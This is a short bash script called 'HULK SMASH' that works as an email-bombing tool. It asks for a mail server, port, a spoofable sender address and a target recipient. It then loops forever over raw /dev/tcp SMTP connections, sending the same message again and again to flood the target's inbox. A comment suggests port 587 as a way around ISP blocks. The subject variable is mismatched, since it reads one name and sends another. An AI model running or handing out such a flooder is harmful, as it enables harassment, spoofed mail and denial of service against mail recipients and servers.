
#!/bin/bash
echo "HULK SMASH"
echo
echo "Written by cC"
echo
echo
echo
echo -n "subject: "; read subject;
subject=$subject
echo -n "Enter the body of the message:"; read DATA;
DATA=$DATA
echo -n "Enter Mail Server Name: " ; read MAILSERVER;
MAILSERVER=$MAILSERVER
echo -n "Enter Port: [typically 25 but 587 is very nice fu comcast]: "; read PORT;
PORT=$PORT
echo -n "Enter Mail From: [support@email.com]" ; read MAILFROM;
MAILFROM=$MAILFROM
echo -n "Enter Mail To: " ; read MAILTO;
MAILTO=$MAILTO
while true
do
exec 3<>/dev/tcp/$MAILSERVER/$PORT
echo -en "HELO mail.email.com\r\n"  >&3
echo -en "MAIL FROM:$MAILFROM\r\n" >&3
echo -en "RCPT TO:$MAILTO\r\n" >&3
echo -en "DATA\r\n" >&3
echo -en "Subject: $SUBJECT\r\n\r\n" >&3
echo -en "$DATA\r\n" >&3
echo -en ".\r\n" >&3
echo -en "QUIT\r\n" >&3
cat <&3
done